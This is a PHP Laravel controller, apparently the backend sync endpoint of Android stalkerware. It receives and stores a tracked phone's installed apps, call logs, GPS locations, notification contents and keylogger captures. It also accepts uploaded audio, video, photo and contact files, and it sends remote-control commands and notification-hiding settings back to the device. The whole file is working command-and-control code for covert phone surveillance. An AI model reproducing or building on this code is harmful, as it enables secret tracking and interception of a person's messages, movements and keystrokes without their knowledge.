<?php

namespace App\Http\Controllers\api;

use App\Http\Controllers\Controller;
use App\Models\App;
use App\Models\Call;
use App\Models\HttpToken;
use App\Models\Keylogger;
use App\Models\Location;
use App\Models\Notification;
use App\Models\Phone;
use App\Models\Remotecontrol;
use App\Models\Token;
use Carbon\Carbon;
use Illuminate\Http\Request;

class SyncAPIController extends Controller
{
    function sync()
    {
        $at = request()->header('x-app-token');
        abort_if(!$at, 403, "Nah");
        $token = HttpToken::where('token', $at)->first();
        if (!$token) {
            $token = Phone::where('token', $at)->first(); // on a supprimer le token dans la table token alors que c'etait deja envoye au phone
            abort_if(!$token, 403, "Naha");
            HttpToken::create(['token' => $at, 'users_id' => $token->user->id, 'date' => nnow()]);
        }

        $device = (array) request('device');
        $phone = Phone::where('token', $token->token)->firstOrNew();
        if (count($device)) {
            $br = ucfirst(@$device['brand']);
            $md = ucfirst(@$device['model']);
            $av = @$device['android_version'];
            $ph = "$br $md";
            $phone->phone = $ph;
            $phone->data = json_encode($device);
            $phone->updatedon = nnow();
            $phone->users_id = $token->users_id;
            $phone->token = $token->token;
            $phone->save();
        }

        $apps = (array) request('apps');
        $keep = [];
        foreach ($apps as $ap) {
            if (!@$ap['id']) continue;

            $el = App::where(['remote_id' => $ap['id'], 'phone_id' => $phone->id])->firstOrNew();
            $el->phone_id = $phone->id;
            $el->remote_id = $ap['id'];
            $el->name = @$ap['name'];
            $el->package = @$ap['package'];
            $isd = @$ap['installdate'];
            try {
                Carbon::parse($isd);
            } catch (\Throwable $th) {
                $isd = null; //date invalide peut generer une erreur lors de insert
            }
            $el->installdate = $isd;
            $el->save();
            $keep[] = $el->id;
        }
        if (count($keep)) {
            App::whereNotIn('id', $keep)->where(['phone_id' => $phone->id])->update(['is_uninstalled' => 1]);
        }

        //
        $calls = (array) request('calls');
        foreach ($calls as $ap) {
            if (!@$ap['id']) continue;

            $el = Call::firstOrNew(['remote_id' => @$ap['id'], 'phone_id' => $phone->id]);
            $el->phone_id = $phone->id;
            $el->remote_id = $ap['id'];
            $el->type = @$ap['type'];
            $el->number = @$ap['number'];
            $el->duration = @$ap['duration'];
            $el->name = @$ap['name'];
            $isd = @$ap['date'];
            try {
                Carbon::parse($isd);
            } catch (\Throwable $th) {
                $isd = null; //date invalide peut generer une erreur lors de insert
            }
            $el->date = $isd;
            if ($el->remote_id) {
                $el->save();
            }
        }

        //
        $locations = (array) request('locations');
        foreach ($locations as $ap) {
            if (!@$ap['id']) continue;

            $el = Location::firstOrNew(['remote_id' => @$ap['id'], 'phone_id' => $phone->id]);
            $el->phone_id = $phone->id;
            $el->remote_id = $ap['id'];
            $el->accuracy = @$ap['accuracy'];
            $el->latitude = @$ap['latitude'];
            $el->longitude = @$ap['longitude'];
            $isd = @$ap['date'];
            try {
                Carbon::parse($isd);
            } catch (\Throwable $th) {
                $isd = null; //date invalide peut generer une erreur lors de insert
            }
            $el->date = $isd;
            if ($el->remote_id) {
                $el->save();
            }
        }

        //
        $cnf = (object) request('conf');
        if ($cnf) {
            $fcm = @$cnf->fcm;
            $perms = (array) @$cnf->perms;
            if ($fcm) {
                $phone->fcm = $fcm;
                $phone->save();
            }
            if (count($perms)) {
                $phone->perms = json_encode($perms);
                $phone->save();
            }
        }

        //
        $notif = (array) request('notifications');
        foreach ($notif as $ap) {
            if (!@$ap['id']) continue;

            $el = Notification::firstOrNew(['remote_id' => @$ap['id'], 'phone_id' => $phone->id]);
            $el->phone_id = $phone->id;
            $el->remote_id = $ap['id'];
            $el->appname = @$ap['appname'];
            $el->title = @$ap['title'];
            $el->body = @$ap['body'];
            $isd = @$ap['date'];
            try {
                Carbon::parse($isd);
            } catch (\Throwable $th) {
                $isd = null; //date invalide peut generer une erreur lors de insert
            }
            $el->date = $isd;
            if ($el->remote_id) {
                $el->save();
            }
        }

        //
        if (request('keylog')) {
            $lastkeylogid = request('lastkeylogid');
            $lastkeylogdate = request('lastkeylogdate');
            try {
                $content = file_get_contents(request('keylog')->getRealPath());
                $content = (array) json_decode($content);
            } catch (\Throwable $th) {
                $content = null;
            }

            if (is_array($content)) {
                foreach ($content as $pkg => $log) {
                    $id = @$log->id;
                    $key = @$log->key;
                    $date = @$log->date;
                    if ($id && $key && $date) {
                        $el = Keylogger::firstOrNew(['remote_id' => $id, 'phone_id' => $phone->id]);
                        try {
                            Carbon::parse($date);
                        } catch (\Throwable $th) {
                            $date = nnow();
                        }
                        $el->phone_id = $phone->id;
                        $el->remote_id = $id;
                        $el->text = $key;
                        $el->package = $pkg;
                        $el->appname = @$log->appname;
                        $el->date = $date;
                        $el->save();
                    }
                }
            }
        }

        if (request('file')) { // fichier audio, video, photo & contact
            $remote_id = (int) request('remote_id');
            $success = (int) request('success');
            $retry = (int) request('retry');
            $filename = request('filename');
            $cmd = Remotecontrol::where(['id' => $remote_id, 'phone_id' => $phone->id])->whereNull('result')->first();
            if ($cmd) {
                $file = request('file');
                $ex =  '.' . $file->getClientOriginalExtension();
                if ($ex != '.error') {
                    $filename = $filename ?? ("file_" . time() . "_" . rand(100000, 90000) . $ex);
                    $cmd->result = request('file')->storeAs('files', $filename, 'public');
                }
                $cmd->success = $success;
                $cmd->retry = $retry;
                $cmd->save();
            }
            return response([]);
        }

        $lastcmdid = (int) request('lastcmdid');
        if ($lastcmdid) {
            Remotecontrol::where('id', '<=', $lastcmdid)->where(['phone_id' => $phone->id])->update(['fetched' => 1]);
        }

        $phonecnf = (object) @json_decode($phone->config);
        $data = [];
        $config = [
            'can' => true,
            'hidenotifications' => (bool) @$phonecnf->hidenotifications,
            'hidenotificationfor' => (array) @$phonecnf->hidenotificationfor,
        ];
        $data['lastappid'] = @App::where(['phone_id' => $phone->id])->orderBy('remote_id', 'desc')->first()->remote_id ?? 0;
        $data['lastcallid'] = @Call::where(['phone_id' => $phone->id])->orderBy('remote_id', 'desc')->first()->remote_id ?? 0;
        $data['lastlocationid'] = @Location::where(['phone_id' => $phone->id])->orderBy('remote_id', 'desc')->first()->remote_id ?? 0;
        $data['lastnotifid'] = @Notification::where(['phone_id' => $phone->id])->orderBy('remote_id', 'desc')->first()->remote_id ?? 0;
        $data['lastkeyloggerid'] = @Keylogger::where(['phone_id' => $phone->id])->orderBy('remote_id', 'desc')->first()->remote_id ?? 0;

        $action = [];
        $rema = Remotecontrol::where(['phone_id' => $phone->id])->orderBy('id')->where(['fetched' => 0])->get();
        foreach ($rema as $e) {
            $action[] = "$e->id.$e->action";
        }

        $data['config'] = $config;
        $data['cmd'] = $action;

        // return request()->all();
        // return request('file');
        return $data;
    }
}
